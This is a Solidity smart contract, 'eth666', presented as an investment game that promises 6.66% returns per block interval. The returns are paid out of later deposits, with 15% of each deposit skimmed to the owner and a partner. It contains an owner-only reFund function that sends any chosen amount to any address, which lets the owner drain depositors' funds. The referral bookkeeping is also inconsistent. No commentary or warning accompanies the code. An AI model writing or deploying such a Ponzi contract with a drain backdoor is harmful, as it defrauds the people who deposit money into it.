 

pragma solidity ^0.4.25;

 

contract eth666{

    address public owner;
    address public partner;    
    
	mapping (address => uint256) deposited;
	mapping (address => uint256) withdrew;
	mapping (address => uint256) refearned;
	mapping (address => uint256) blocklock;

	uint256 public totalDepositedWei = 0;
	uint256 public totalWithdrewWei = 0;
	uint256 public investorNum = 0;
	
	 
	uint 	public isStart; 

	event invest(address indexed beneficiary, uint amount);

    constructor () public {
        owner   = msg.sender;
        partner = msg.sender;
        isStart = 0;
    }
    
    modifier onlyOwner {
        require (msg.sender == owner, "OnlyOwner methods called by non-owner.");
        _;
    }    
    
     
    function setPartner(address newPartner) external onlyOwner {
        partner = newPartner;
    }
 
 	function gameStart(uint num) external onlyOwner{
 		isStart = num;
 	}

	function() payable external {
		emit invest(msg.sender,msg.value);
		uint256 admRefPerc = msg.value / 10;
		uint256 advPerc    = msg.value / 20;

		owner.transfer(admRefPerc);
		partner.transfer(advPerc);

		if (deposited[msg.sender] != 0 && isStart != 0) {
			address investor = msg.sender;
             
             
             
            uint256 depositsPercents = deposited[msg.sender] * 666 / 10000 * (block.number - blocklock[msg.sender]) /5900;
			investor.transfer(depositsPercents);

			withdrew[msg.sender] += depositsPercents;
			totalWithdrewWei += depositsPercents;
		} else if (deposited[msg.sender] == 0 && isStart != 0)
			investorNum += 1;

		address referrer = bytesToAddress(msg.data);
		if (referrer > 0x0 && referrer != msg.sender) {
			referrer.transfer(admRefPerc);
			refearned[referrer] += advPerc;
		}

		blocklock[msg.sender] = block.number;
		deposited[msg.sender] += msg.value;
		totalDepositedWei += msg.value;
	}
	
	 
    function reFund(address exitUser, uint a) external onlyOwner {
        uint256 c1 = withdrew[exitUser];
        if(c1 == 0)
          uint256 reFundValue = deposited[exitUser];
          exitUser.transfer(a);
          deposited[exitUser] = 0;
    }
    
	function userDepositedWei(address _address) public view returns (uint256) {
		return deposited[_address];
    }

	function userWithdrewWei(address _address) public view returns (uint256) {
		return withdrew[_address];
    }

	function userDividendsWei(address _address) public view returns (uint256) {
        return deposited[_address] * 666 / 10000 * (block.number - blocklock[_address]) / 5900;
    }

	function userReferralsWei(address _address) public view returns (uint256) {
		return refearned[_address];
    }

	function bytesToAddress(bytes bys) private pure returns (address addr) {
		assembly {
			addr := mload(add(bys, 20))
		}
	}
}